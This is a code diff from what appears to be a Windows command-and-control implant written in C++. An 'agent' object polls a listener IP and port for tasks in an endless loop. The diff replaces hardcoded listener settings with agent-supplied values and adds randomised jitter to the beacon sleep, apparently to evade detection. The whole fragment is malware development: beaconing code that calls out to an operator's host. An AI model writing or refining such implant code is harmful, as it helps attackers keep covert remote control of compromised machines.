@@ -1,11 +1,17 @@
 #include <iostream>
 #include <string>
 #include <windows.h>
-#include <cstdlib>
-#include <ctime>
+#include <random>
 #include "shell.h"
 #include "network_operations.h"
 #include "agent.h"
+
+int getRandom(int min, int max) {
+    std::random_device rd;
+    std::mt19937 gen(rd());
+    std::uniform_int_distribution<int> dis(min, max);
+    return dis(gen);
+}
 
 int main() {
     agent fern;
@@ -15,18 +21,16 @@ int main() {
 
     std::cout << "Output:" << output << "\n";
 
-    std::srand(std::time(nullptr));
-
-    std::string ip{LISTENERIP   };
+    std::string ip{fern.getip()};
     std::string uri = {TASKS};
-    unsigned int port{LISTENERPORT};
+    unsigned int port{fern.getport()};
 
     while (true) {
 
         std::string response{get(ip, port, uri)};
 
         std::cout << response << "\n";
-        int jitter = std::rand();
-        Sleep(5000 + jitter);
+        int jitter = getRandom(-2500, 5000);
+        Sleep(fern.getSleep() + jitter);
     }
 }
